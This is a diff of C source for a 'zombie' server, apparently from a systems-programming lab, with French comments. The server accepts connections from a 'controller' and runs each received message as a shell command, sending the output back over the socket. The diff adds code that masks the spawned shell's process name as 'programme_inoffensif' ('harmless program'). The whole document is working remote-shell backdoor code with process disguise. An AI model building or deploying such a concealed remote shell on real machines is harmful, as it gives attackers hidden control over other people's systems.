@@ -35,43 +35,23 @@ int main(int argc, char **argv) {
   }
 
   sockfd = initSocketServer(port);
-  printf("Le serveur tourne sur le port : %d \n", port);
+  printf("The server listens on the port : %d \n", port);
   pid_t childPID;
   int status;
   while (1) {
-    printf("tst\n");
     // newsockfd = accept(sockfd, NULL, NULL);
     newsockfd = saccept(sockfd); // quand labo mettre accept!!
-    printf("Le controller est connecté sur le zombie...\n");
 
     if (newsockfd > 0) {
+      printf("ret : %d & sock: %d\n", ret, newsockfd);
       while ((ret = sread(newsockfd, msg, sizeof(msg))) != 0) {
         childPID = fork_and_run2(childExec, &newsockfd, msg);
-        // swaitpid(childPID, &status, 0);
-        swaitpid(childPID, NULL, 0);
-        if (WIFEXITED(status)) {
-          printf("Processus enfant terminé avec le code de sortie %d\n",
-                 WEXITSTATUS(status));
-        } else if (WIFSIGNALED(status)) {
-          printf("Processus enfant terminé à cause du signal %d\n",
-                 WTERMSIG(status));
-        }
       }
       sclose(newsockfd);
       printf("Connexion finie\n");
     }
   }
   sclose(sockfd);
-}
-
-// establish a passive sock connection
-int initSocketServer(int port) {
-  int sockfd = ssocket();
-  int option = 1;
-  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));
-  sbind(port, sockfd);
-  slisten(sockfd, BACKLOG);
-  return sockfd;
 }
 
 // child process run the command
@@ -84,9 +64,22 @@ void childExec(void *sockfd, void *command) {
   dup2(newsockfd, STDOUT_FILENO);
   dup2(newsockfd, STDERR_FILENO);
 
-  // char *args[] = {"/bin/bash", "-c", command, NULL};
-  // sexecl(sockfd, command);
-  system(script);
-  perror("Something went wrong with execl\n");
+  execl("/bin/sh", "programme_inoffensif", "-c", script, NULL);
+  // system(script);
+
+
+  // execl("./zombie" ,"programme_inoffensif", command);
+  // execl("/bin/sh", "programme_inoffensif", "-c", script, (char *)NULL);
+  perror("Something went wrong with execvp\n");
   exit(EXIT_FAILURE);
+}
+
+// establish a passive sock connection
+int initSocketServer(int port) {
+  int sockfd = ssocket();
+  int option = 1;
+  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));
+  sbind(port, sockfd);
+  slisten(sockfd, BACKLOG);
+  return sockfd;
 }
